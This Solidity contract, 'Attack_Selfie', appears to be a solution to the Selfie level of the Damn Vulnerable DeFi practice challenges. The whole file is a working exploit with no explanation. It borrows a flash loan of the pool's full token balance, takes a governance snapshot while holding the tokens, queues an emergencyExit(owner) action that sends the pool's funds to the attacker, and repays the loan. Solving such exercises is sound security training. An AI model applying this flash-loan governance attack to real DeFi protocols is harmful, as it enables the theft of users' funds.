// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attack_Selfie is IERC3156FlashBorrower{
    address owner;
    SelfiePool pool;
    ISimpleGovernance gov;
    uint256 max_loan;

    constructor() 
    {
        owner = msg.sender;
    }

    function letsAGo(address _pool, address _gov) public
    {
        pool        = SelfiePool(_pool);
        gov         = ISimpleGovernance(_gov);
        max_loan    = pool.token().balanceOf(_pool);

        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(pool.token()), max_loan, "0x");
    }

    function letsAGoV2() public
    {
        gov.executeAction(1);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32)
    {
        DamnValuableTokenSnapshot(token).snapshot();
        gov.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", owner));

        DamnValuableTokenSnapshot(token).approve(address(pool), max_loan);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}